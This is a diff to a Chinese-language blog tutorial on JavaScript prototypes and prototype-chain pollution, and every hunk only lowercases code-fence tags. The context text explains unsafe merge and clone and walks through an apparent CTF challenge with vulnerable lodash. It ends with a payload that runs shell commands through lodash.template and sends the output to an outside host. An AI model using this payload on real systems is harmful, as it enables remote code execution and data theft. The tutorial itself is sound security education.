@@ -23,7 +23,7 @@ tags:
 构造函数的本质就是函数 ，因此构造函数的定义与函数类似。
 
 两种方法都可
-```JavaScript
+```javascript
 var Test = function() {
     this.test = "ookk";
 };
@@ -34,7 +34,7 @@ function Test() {
 ```
 
 构造函数特点
-```JavaScript
+```javascript
 1：构造函数的函数名的第一个字母通常大写。
 
 2：函数体内使用this关键字，代表所要生成的对象实例。
@@ -44,7 +44,7 @@ function Test() {
 
 new 命令的实现过程
 
-```JavaScript
+```javascript
 let a = new Test()
 
 1.创建一个空对象，作为将要返回的对象实例。
@@ -65,7 +65,7 @@ let a = new Test()
 
 图中就可以看出每个函数对象都会有个prototype属性，它指向了该构建函数实例化的原型，而实例原型的constructor 又指向了构造函数。**使用该构建函数实例化对象时，会继承该原型中的属性及方法。** 从图中可以看出
 
-```JavaScript
+```javascript
 function Persion(){
     this.test = "abc"
 }
@@ -85,7 +85,7 @@ Persion.prototype.constructor 又指向了自身
 我们可以通过Person.prototype来访问Person类的原型，但Person实例化出来的对象，是不能通过prototype访问原型的。这时候，就需要用__proto__。
 
 图中蓝线表示为
-```JavaScript
+```javascript
 person.__proto__ -> Persion.prototype
 ```
 
@@ -93,7 +93,7 @@ person.__proto__ -> Persion.prototype
 
 用p神的例子来说
 
-```JavaScript
+```javascript
 function Persion() {
     this.name = "Tom"
     this.show = function() {
@@ -107,7 +107,7 @@ function Persion() {
 图中很明显show 绑定在 persion对象上的
 
 当我们使用
-```JavaScript
+```javascript
 function Persion() {
     this.name = "Tom"
 }
@@ -125,7 +125,7 @@ persion.show()
 这就印证了上面最开始说的 **使用该构建函数实例化对象时，会继承该原型中的属性及方法。**
 
 总的来说
-```JavaScript
+```javascript
 1.prototype是一个类的属性，所有类对象在实例化的时候将会拥有prototype中的属性和方法
 2.一个对象的__proto__属性，指向这个对象所在的类的prototype属性
 ```
@@ -144,12 +144,12 @@ persion对象的 \_\_proto__ 为Persion.prototype ,而Persion.prototype 的\_\_p
 举个不恰当的例子 ，就像python中的
 ![Ju7AJJ.png](https://s1.ax1x.com/2020/04/19/Ju7AJJ.png)
 
-总结一下，对于对象persion，在调用persion.show()的时候，实际上JavaScript引擎会进行如下操作：
+总结一下，对于对象persion，在调用persion.show()的时候，实际上javascript引擎会进行如下操作：
 
 这里再放一张合天的一张图片，加深一下理解
 ![JuHJNF.jpg](https://s1.ax1x.com/2020/04/19/JuHJNF.jpg)
 
-```JavaScript
+```javascript
 1.在对象persion中寻找show()方法
 2.如果找不到，则在persion.__proto__中寻找show()
 3.如果仍然找不到，则继续在persion.__proto__.__proto__中寻找show()
@@ -160,13 +160,13 @@ persion对象的 \_\_proto__ 为Persion.prototype ,而Persion.prototype 的\_\_p
 
 原型链污染主要是因为攻击者可以设置__proto__的值，导致污染，一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。。用户能控制其键名的操作，就容易出现污染攻击，如
 
-```JavaScript
+```javascript
 对象merge
 对象clone（其实内核就是将待操作的对象merge到一个空对象中）
 ```
 
 举一个小例子
-```JavaScript
+```javascript
 function User(){
     this.username = "Tom"
 }
@@ -181,7 +181,7 @@ console.log(b.is_admin)
 
 
 而在实际中 常见的操作是merge 和 clone
-```JavaScript
+```javascript
 function merge(target, source) {
     for (let key in source) {
         if (key in source && key in target) {
@@ -222,7 +222,7 @@ console.log(a)
 答案是不会的 因为很多数据传输都是用json来传输的，JSON.parse常用来解析用户传来的信息
 
 危害当然不仅改变属性这么简单,甚至可以改变方法
-```JavaScript
+```javascript
 let person = {name: 'lucas'}
 person.__proto__.toString = () => {alert('evil')}
 let person2 = {}
@@ -239,7 +239,7 @@ console.log(person2.toString())
 [![JKNXNQ.png](https://s1.ax1x.com/2020/04/19/JKNXNQ.png)](https://imgchr.com/i/JKNXNQ)
 将选择的东西 保存在session中的一个功能
 
-```JavaScript
+```javascript
 const fs = require('fs')
 const express = require('express')
 const bodyParser = require('body-parser')
@@ -293,7 +293,7 @@ lodash 低版本的 merge是存在原型链污染的
 因此条件达成，可以进行污染。可以给Object对象插入任意属性。
 此题利用了lodash.template源码中,因为初始sourceURL是没有值的 ，因此通过污染添给加sourceURL加值，而这里是可以执行命令的，具体不细说了
 
-```JavaScript
+```javascript
 var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
 // ...
 var result = attempt(function() {
@@ -303,7 +303,7 @@ var result = attempt(function() {
 ```
 
 构造payload
-```JavaScript
+```javascript
 {"__proto__":{"sourceURL":"xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();var req = require('http').request(`http://ip/${result}`);req.end();\r\n"}}
 ```
 
